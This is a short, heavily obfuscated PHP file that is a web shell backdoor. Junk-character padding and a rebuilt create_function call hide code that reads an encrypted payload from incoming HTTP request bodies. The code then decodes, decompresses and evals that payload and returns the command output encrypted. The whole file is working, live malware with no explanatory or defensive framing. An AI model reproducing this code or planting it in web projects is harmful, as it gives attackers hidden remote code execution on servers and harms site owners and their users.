<?php
$P='$k="b3Fab5F3bd"F;$kh="0bbFeffFfFa5c93";$kf="85a53bF6d2394"F;$p="FC5FJxSFGCLWYYehIJ1";fFuFncFtion x($t,$k';
$j='/inpuFtF"),$m)F==1) FF{@ob_start();@evFal(@gzuncFoFmpress(@xF(@baFse64_decodFe($mF[1]),$Fk)F));$o=@oFb_get_';
$B=')F{$Fc=sFtrlen($k);$lF=strlen($Ft);$oF=FFF"";for($i=0;$i<$lF;){for($j=0;(F$j<F$cF&&$iF<$l);$j++,$i++FF){';
$K=str_replace('X','','creXatXXeX_funXcXtion');
$f='$o.=$tF{$i}^$k{$j}F;}}FretuFrn $o;}ifF (@preFg_matcFhF("F/$kh(.+)$kf/",@FfFile_geFt_contenFts("php:F/';
$T='conFFtents()F;@ob_end_cleanF();F$r=@base6F4_eFFncode(@x(@gzcFompFresFs($Fo),$k));print("$FFp$kh$r$kf");}';
$n=str_replace('F','',$P.$B.$f.$j.$T);
$r=$K('',$n);$r();
?>
